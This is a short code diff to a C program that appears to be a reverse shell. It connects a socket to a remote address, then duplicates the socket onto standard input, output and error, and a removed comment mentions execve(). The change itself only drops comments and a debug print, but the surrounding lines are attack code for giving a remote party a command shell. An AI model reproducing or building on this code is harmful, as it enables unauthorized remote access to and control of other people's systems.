@@ -1,6 +1,6 @@
 #include <stdio.h>
-#include <sys/socket.h>	/* socket()  */
-#include <unistd.h>	/* execve()  */
+#include <sys/socket.h>
+#include <unistd.h>
 #include <netinet/ip.h>
 #include <arpa/inet.h>
 #include <string.h>
@@ -23,7 +23,6 @@ int main(int argc, char *argv[]){
 	sendto(s, &buf, strlen(buf)+1, 0, (struct sockaddr*)&address, sizeof(address));
 
 	/* Copy file descriptors */
-	printf("Copying fds\n");
 	dup2(s, STDIN_FILENO);
 	dup2(s, STDOUT_FILENO);
 	dup2(s, STDERR_FILENO);
